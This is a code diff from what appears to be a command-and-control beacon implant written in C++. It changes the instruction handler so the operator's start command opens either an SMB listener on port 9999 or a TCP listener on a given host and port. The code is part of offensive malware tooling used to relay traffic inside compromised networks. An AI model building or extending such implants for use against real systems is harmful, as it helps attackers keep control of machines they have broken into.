@@ -424,31 +424,44 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 
 		if(splitedCmd[0]==StartCmd)
 		{
-			std::string localHost = splitedCmd[1];
-			int localPort = std::stoi(splitedCmd[2]);
-
-			std::vector<unique_ptr<Listener>>::iterator object = 
-				find_if(m_listeners.begin(), m_listeners.end(),
-						[&](unique_ptr<Listener> & obj){ return obj->getPort() == localPort;}
-						);
-
-			if(object!=m_listeners.end())
+			if(splitedCmd[1]=="smb")
 			{
-				std::string msg = "Listener already exist";
-				// Respond the listener already exist
-				c2RetMessage.set_cmd("");
-				c2RetMessage.set_returnvalue(msg);
-			}
-			else
-			{
-				// TODO fail ??
-				std::unique_ptr<ListenerTcp> listenerTcp = make_unique<ListenerTcp>(localHost, localPort);
-				std::string listenerHash = listenerTcp->getListenerHash();
-				m_listeners.push_back(std::move(listenerTcp));
+				std::unique_ptr<ListenerSmb> listenerSmb = make_unique<ListenerSmb>("", 9999);
+				std::string listenerHash = listenerSmb->getListenerHash();
+				m_listeners.push_back(std::move(listenerSmb));
 
 				// Respond with the listener hash
 				c2RetMessage.set_cmd(cmd);
 				c2RetMessage.set_returnvalue(listenerHash);
+			}
+			else if(splitedCmd[1]=="tcp")
+			{
+				std::string localHost = splitedCmd[2];
+				int localPort = std::stoi(splitedCmd[3]);
+
+				std::vector<unique_ptr<Listener>>::iterator object = 
+					find_if(m_listeners.begin(), m_listeners.end(),
+							[&](unique_ptr<Listener> & obj){ return obj->getPort() == localPort;}
+							);
+
+				if(object!=m_listeners.end())
+				{
+					std::string msg = "Listener already exist";
+					// Respond the listener already exist
+					c2RetMessage.set_cmd("");
+					c2RetMessage.set_returnvalue(msg);
+				}
+				else
+				{
+					// TODO fail ??
+					std::unique_ptr<ListenerTcp> listenerTcp = make_unique<ListenerTcp>(localHost, localPort);
+					std::string listenerHash = listenerTcp->getListenerHash();
+					m_listeners.push_back(std::move(listenerTcp));
+
+					// Respond with the listener hash
+					c2RetMessage.set_cmd(cmd);
+					c2RetMessage.set_returnvalue(listenerHash);
+				}
 			}
 		}
 		else if(splitedCmd[0]==StopCmd)
